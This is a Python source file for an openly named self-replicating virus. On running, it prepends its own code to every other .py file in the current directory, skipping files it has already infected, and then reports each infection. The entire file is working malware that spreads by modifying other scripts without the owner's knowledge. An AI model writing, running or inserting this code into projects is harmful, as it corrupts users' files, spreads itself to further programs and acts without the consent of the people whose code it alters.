import os


def inject(virus_file, target_py_file):
    with open(virus_file, 'r') as virus:
        virus_content = virus.read()
        virus_content = virus_content[:virus_content.rfind("main()")+6]

    with open(target_py_file, 'r') as target_read:
        save_target_content = target_read.read()
        if save_target_content.find(virus_content) != -1:
            print(f'{target_py_file} is already infected!')
            return 0
        else:
            with open(target_py_file, 'w') as injection:
                injection.write(virus_content + '\n' + save_target_content)
            return 1


def main():

    current_dir = os.getcwd()

    files = os.listdir(current_dir)

    for target_filename in files:

        virus_filename = __file__[__file__.rfind('\\')+1:]
        if target_filename.endswith(".py") and target_filename != virus_filename:

            if inject(virus_filename, target_filename):
                print(f'The code was injected successfully in: {target_filename} file')


main()
